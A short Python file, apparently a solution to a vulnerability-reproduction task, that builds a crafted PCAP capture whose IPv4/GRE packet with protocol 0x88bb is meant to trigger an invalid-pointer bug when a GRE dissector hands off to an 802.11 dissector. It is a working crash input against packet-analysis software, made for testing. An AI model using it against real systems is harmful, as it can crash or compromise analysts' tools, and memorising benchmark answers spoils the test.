import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PCAP Global Header (24 bytes)
        # Magic (LE), Major(2), Minor(4), Zone(0), Sig(0), Snap(65535), Network(12=DLT_RAW)
        global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 12)
        
        # Packet Data
        # IPv4 Header (20 bytes): Proto 47 (GRE)
        # GRE Header (4 bytes): Protocol 0x88bb (IEEE 802.11)
        # The vulnerability is triggered when GRE calls 802.11 dissector with invalid data pointer
        ip_header = b'\x45\x00\x00\x18\x00\x00\x00\x00\x40\x2f\x00\x00\x7f\x00\x00\x01\x7f\x00\x00\x01'
        gre_header = b'\x00\x00\x88\xbb'
        packet_data = ip_header + gre_header
        
        # Packet Header (16 bytes)
        packet_header = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))
        
        return global_header + packet_header + packet_data